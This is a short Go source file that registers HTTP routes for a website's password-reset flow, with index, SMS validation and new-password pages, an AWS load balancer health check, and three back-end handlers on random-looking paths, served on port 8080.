package main

import (
	"log"
	"net/http"

	"website/web/app/handlers"
	"website/web/app/handlers/actions"
)

func main() {
	// html page
	http.HandleFunc("/", handlers.HandlerIndex)
	http.HandleFunc("/index", handlers.HandlerIndex)
	http.HandleFunc("/validation", handlers.HandlerSmsValidation)
	http.HandleFunc("/newpassword", handlers.HandlerUpdatePassword)

	// AWS ALB healthcheck
	http.HandleFunc("/health", handlers.HandlerHealthCheck)

	// back-end handlers
	http.HandleFunc("/fqz4DZd", actions.ProcessIndex)
	http.HandleFunc("/jmo92DZ", actions.ProcessSMSValidation)
	http.HandleFunc("/fqz932d", actions.ProcessUpdatePassword)

	log.Fatal(http.ListenAndServe(":8080", nil))
}
